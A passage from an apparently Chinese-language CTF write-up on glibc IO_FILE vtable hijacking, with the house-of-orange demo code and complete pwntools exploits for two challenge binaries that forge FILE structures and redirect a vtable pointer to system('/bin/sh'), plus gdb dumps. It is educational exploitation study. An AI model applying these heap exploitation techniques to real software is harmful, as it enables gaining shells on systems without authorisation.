__seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="常用对应iofile函数"><a href="#常用对应iofile函数" class="headerlink" title="常用对应iofile函数"></a>常用对应iofile函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fread    -&gt; __xsgetn   -&gt; __doallocate  -&gt; __stat  -&gt; __underflow -&gt; __read</span><br><span class="line">fwrite    -&gt; __xsputn   -&gt; __docallocate  -&gt; __overflow  -&gt; __write</span><br><span class="line">fclose    -&gt;  __finish  -&gt; __overflow  /  -&gt; __fclose   //根据标志位来改变模式</span><br><span class="line">malloc_printerr    -&gt; __overflow</span><br><span class="line">exit    -&gt; _setbuf</span><br></pre></td></tr></table></figure><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><p>在源码分析中我们知道io相关操作最后会调用vtable中的函数，所以利用方法就是修改vtable中的值，或者是实现对整个FILE结构体的伪造来修改虚表，当然本质上没有太大的区别。</p><h1 id="利用演示"><a href="#利用演示" class="headerlink" title="利用演示"></a>利用演示</h1><p>还是使用下how2heap上的例子，这里是结合了house of orange，可以跟着源码调试理解。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int winner ( char *ptr);</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    char *p1, *p2;</span><br><span class="line">    size_t io_list_all, *top;</span><br><span class="line"></span><br><span class="line">    // 首先分配一个 0x400 的 chunk</span><br><span class="line">    p1 = malloc(0x400-16);</span><br><span class="line"></span><br><span class="line">    // 拿到 top chunk的地址</span><br><span class="line">    top = (size_t *) ( (char *) p1 + 0x400 - 16);</span><br><span class="line">    // 修改 top chunk 的 size</span><br><span class="line">    top[1] = 0xc01;</span><br><span class="line"></span><br><span class="line">    // 触发 syscall 的 _int_free, top_chunk 放到了 unsort bin</span><br><span class="line">    p2 = malloc(0x1000);</span><br><span class="line"></span><br><span class="line">    // 根据 fd 指针的偏移计算 io_list_all 的地址</span><br><span class="line">    io_list_all = top[2] + 0x9a8;</span><br><span class="line"></span><br><span class="line">    // 修改 top_chunk 的 bk 为  io_list_all - 0x10 ， 后面会触发</span><br><span class="line">    top[3] = io_list_all - 0x10;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     设置 fp 指针指向位置 开头 为 /bin/sh</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    memcpy( ( char *) top, &quot;/bin/sh\x00&quot;, 8);</span><br><span class="line"></span><br><span class="line">    // 修改 top chunk 的 大小 为 0x60</span><br><span class="line">    top[1] = 0x61;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">      为了可以正常调用 overflow() ，需要满足一些条件</span><br><span class="line">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    _IO_FILE *fp = (_IO_FILE *) top;</span><br><span class="line"></span><br><span class="line">    fp-&gt;_mode = 0; </span><br><span class="line">    fp-&gt;_IO_write_base = (char *) 2;</span><br><span class="line">    fp-&gt;_IO_write_ptr = (char *) 3; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 设置虚表</span><br><span class="line">    size_t *jump_table = &amp;top[12]; // controlled memory</span><br><span class="line">    jump_table[3] = (size_t) &amp;winner;</span><br><span class="line">    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8</span><br><span class="line"></span><br><span class="line">    // 再次 malloc, fastbin, smallbin都找不到需要的大小，会遍历 unsort bin 把它们添加到对应的 bins 中去</span><br><span class="line">    // 之前已经把 top-&gt;bk 设置为 io_list_all - 0x10, 所以会把 io_list_all 的值 设置为 fd, </span><br><span class="line">    // 也就是 main_arena+88 </span><br><span class="line">    // _IO_FILE_plus + 0x68 --&gt; _china , main_arena+88 + 0x68 为 smallbin[5], 块大小为 0x60 </span><br><span class="line">    // 所以要把 top的 size 设置为 0x60</span><br><span class="line">    malloc(10);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int winner(char *ptr)</span><br><span class="line">&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以发现，实际上在利用时是将top chunk放入unsorted bin中之后将其作为FILE结构体，并将虚表设置在了FILE结构体中，最后触发malloc_printerr，内部调用<strong>libc_message，再内部调用abort，abort中调用fflush即_IO_flush_all_lockp，其中调用</strong>OVERFLOW时调用 vtable中的 __overflow，触发system(‘/bin/sh’)。</p><p>当然利用方法不止这一种，也能够使程序去调用其他函数getshell。</p><h1 id="利用实例"><a href="#利用实例" class="headerlink" title="利用实例"></a>利用实例</h1><h2 id="task-challenge1"><a href="#task-challenge1" class="headerlink" title="task_challenge1"></a>task_challenge1</h2><h3 id="方向"><a href="#方向" class="headerlink" title="方向"></a>方向</h3><p>控制fp指针伪造FILE 与 vtable，因为fclose时调用vtable中的_finish，所以将其覆盖为system</p><p>伪造的FILE结构体前四个字节需要满足 flags &amp; is_filebuf 即 flags &amp; 0x2000为0，会直接调用_io_finish<br>0xffffdfff  &amp; 0x2000 = 0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_IS_FILEBUF 0x2000</span><br><span class="line"></span><br><span class="line">if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  else</span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? -1 : 0;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br></pre></td></tr></table></figure><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>一道iofile练手题，与pwnable.tw上那道有些相似，可以输入，输出，退出</p><p>输入直接调用gets，在bss段，可以覆盖打开文件的指针，伪造结构体可以一块进行<br>退出会调用fclose关闭文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000006010C0 ; char s[256]</span><br><span class="line">.bss:00000000006010C0 s               db 100h dup(?)          ; DATA XREF: get+4↑o</span><br><span class="line">.bss:00000000006010C0                                         ; put+4↑o</span><br><span class="line">.bss:00000000006011C0 ; FILE *stream</span><br><span class="line">.bss:00000000006011C0 stream          dq ?                    ; DATA XREF: exits+4↑r</span><br></pre></td></tr></table></figure></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;./task_challenge1&apos;)</span><br><span class="line">elf = ELF(&apos;./task_challenge1&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">elf = ELF(&apos;task_challenge1&apos;)</span><br><span class="line">#libc=ELF(&apos;&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buf_addr = 0x6010c0</span><br><span class="line">system = 0x400897</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_file = p32(0xffffdfff)+&apos;;/bin/sh\x00&apos;</span><br><span class="line">fake_file = fake_file.ljust(0xd8,&apos;\0&apos;)</span><br><span class="line">vtable = buf_addr+0xe0</span><br><span class="line">fake_file += p64(vtable)</span><br><span class="line"></span><br><span class="line">pay = fake_file</span><br><span class="line">pay += p64(0)*2</span><br><span class="line">pay += p64(system)             #vtable finish , fclose will call this func.</span><br><span class="line">pay = pay.ljust(0x100,&apos;\0&apos;)</span><br><span class="line">pay += p64(buf_addr)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,&apos;1&apos;)</span><br><span class="line">sh.sendline(pay)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#sh.recv()</span><br><span class="line">#sh.sendline(&apos;3&apos;)</span><br><span class="line">#exits()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><h3 id="方向-1"><a href="#方向-1" class="headerlink" title="方向"></a>方向</h3><p>就是演示代码的实际利用。</p><p>malloc_printerr 会调用_io_overflow<br>伪造被放入unsorted bin中的top chunk为FILE 结构体，使之能够绕过检查进入_IO_OVERFLOW (fp, EOF)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)  //需要bypass的条件</span><br><span class="line">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">   || (_IO_vtable_offset (fp) == 0</span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))                        </span><br><span class="line">#endif</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)                              //改 _IO_OVERFLOW 为 system 劫持程序流！</span><br><span class="line">result = EOF;</span><br></pre></td></tr></table></figure><p>即需要满足任意一种<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.fp-&gt;_mode &lt;= 0</span><br><span class="line">2.fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line">或</span><br><span class="line">1._IO_vtable_offset (fp) == 0</span><br><span class="line">2.fp-&gt;_mode &gt; 0</span><br><span class="line">3.fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br></pre></td></tr></table></figure></p><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>house of orange 的开山之作，因而之后这种利用方法就叫做house of orange<br>题目可以 build ,upgrade ,see<br>build 会创建三个chunk，一个保存其中两个的指针，一个保存大小与颜色，最后为用户自定义大小不大于0x1000的chunk。<br>upgrade 时没有考虑build时的大小，所以会直接溢出<br>see 正常展示，后面会用来泄露</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>没有free，就要创造free的条件，利用溢出修改top chunk头，使得再次申请时因为top chunk大小不够而将其free掉。</p><p>后面申请largebin 大小的chunk使之从中分割来泄露libc 及 heap地址</p><p>利用unsorted bin attack 将_IO_list_all修改为main_arena+0x58，同时old top chunk 会被分入small bin中</p><p>再分配chunk 触发malloc_printerr遍历_IO_list_all调用_IO_OVERFLOW函数触发伪造的FILE结构体中指针指向的system</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;./houseoforange&apos;)</span><br><span class="line">elf = ELF(&apos;./houseoforange&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">elf = ELF(&apos;./houseoforange&apos;)</span><br><span class="line">#libc=ELF(&apos;&apos;)</span><br><span class="line"></span><br><span class="line">def build(size,name,price,color):</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(&quot;1&quot;)</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.send(name)</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(str(price))</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(str(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def see():</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(&quot;2&quot;)</span><br><span class="line"></span><br><span class="line">def upgrade(size,name,price,color):</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(&quot;3&quot;)</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.send(name)</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(str(price))</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(str(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">build(0x20,&apos;1&apos;,20,1)</span><br><span class="line">pay = &apos;a&apos;*0x20+p64(0)+p64(0x21)+&apos;b&apos;*0x10+p64(0)+p64(0xf91)</span><br><span class="line">upgrade(len(pay),pay,20,1)</span><br><span class="line"></span><br><span class="line">#trigger _sys_malloc</span><br><span class="line">build(0x1000,&apos;2&apos;,20,2)</span><br><span class="line"></span><br><span class="line">build(0x400,&apos;3&apos;*8,20,3)</span><br><span class="line">see()</span><br><span class="line">sh.recvuntil(&apos;3&apos;*8)</span><br><span class="line">libc.base = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\0&apos;))-0x3c5188</span><br><span class="line">print hex(libc.base)</span><br><span class="line">io_list_all = libc.base + libc.symbols[&apos;_IO_list_all&apos;]</span><br><span class="line">print hex(io_list_all)</span><br><span class="line">system = libc.base + libc.symbols[&apos;system&apos;]</span><br><span class="line">print hex(system)</span><br><span class="line"></span><br><span class="line">upgrade(0x400,&apos;4&apos;*16,20,4)</span><br><span class="line">see()</span><br><span class="line">sh.recvuntil(&apos;4&apos;*16)</span><br><span class="line">heap_base = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\0&apos;))-0xd0</span><br><span class="line">print hex(heap_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = &apos;e&apos;*0x400</span><br><span class="line">pay += p64(0)+p64(0x21)+p32(1)+p32(0x14)+p64(0)</span><br><span class="line"></span><br><span class="line"># mode &gt;0 &amp;&amp; wide_data-&gt;write_ptr &gt; wide_data-&gt;write_base &amp;&amp; vtable_offset == 0</span><br><span class="line">fake_file = &apos;/bin/sh\x00&apos;+p64(0x61)</span><br><span class="line">fake_file += p64(0xdeadbeef) + p64(io_list_all-0x10) #unsorted bin attack</span><br><span class="line">fake_file = fake_file.ljust(0xa0,&apos;\x00&apos;)</span><br><span class="line">fake_file += p64(heap_base+0x4e0)  #wide_data</span><br><span class="line">fake_file = fake_file.ljust(0xc0,&apos;\x00&apos;)</span><br><span class="line">fake_file += p64(1)  # mode</span><br><span class="line"></span><br><span class="line"># write_base &lt; write_ptr &amp;&amp; mode &lt;=0    </span><br><span class="line">fake_file2 = &apos;/bin/sh\x00&apos;+p64(0x61)</span><br><span class="line">fake_file2 += p64(0xdeadbeef) + p64(io_list_all-0x10)</span><br><span class="line">fake_file2 += p64(0) + p64(1)  # write_base &amp; write_ptr</span><br><span class="line">fake_file2 = fake_file2.ljust(0xc0,&apos;\x00&apos;)</span><br><span class="line">fake_file2 += p64(0)  # mode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay += fake_file         # fake_file &amp; fake_file2 对应着两种绕过检查</span><br><span class="line">pay += p64(0) + p64(0)  </span><br><span class="line">pay += p64(heap_base+0x610) #vtable</span><br><span class="line">pay += p64(0)*2+p64(system)*10</span><br><span class="line"></span><br><span class="line">upgrade(0x800,pay,20,5)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><ul><li><p>mode &gt;0 &amp;&amp; wide_data-&gt;write_ptr &gt; wide_data-&gt;write_base &amp;&amp; vtable_offset == 0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&gt; p *(struct _IO_FILE_plus *) 0x55b527f0b500</span><br><span class="line">$2 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1852400175, </span><br><span class="line">    _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;, </span><br><span class="line">    _IO_read_end = 0xdeadbeef &lt;error: Cannot access memory at address 0xdeadbeef&gt;, </span><br><span class="line">    _IO_read_base = 0x7fa084964510 &quot;&quot;, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x0, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x0, </span><br><span class="line">    _offset = 0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x55b527f0b4e0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 1, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x55b527f0b610</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>write_base &lt; write_ptr &amp;&amp; mode &lt;=0    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&gt; p *(struct _IO_FILE_plus *) 0x55731d86f500 </span><br><span class="line">$1 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1852400175, </span><br><span class="line">    _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;, </span><br><span class="line">    _IO_read_end = 0xdeadbeef &lt;error: Cannot access memory at address 0xdeadbeef&gt;, </span><br><span class="line">    _IO_read_base = 0x7fbcf865f510 &quot;&quot;, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x0, </span><br><span class="line">    _offset = 0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 0, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x55731d86f610</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="ciscn-2019-n-7"><a href="#ciscn-2019-n-7" class="headerlink" 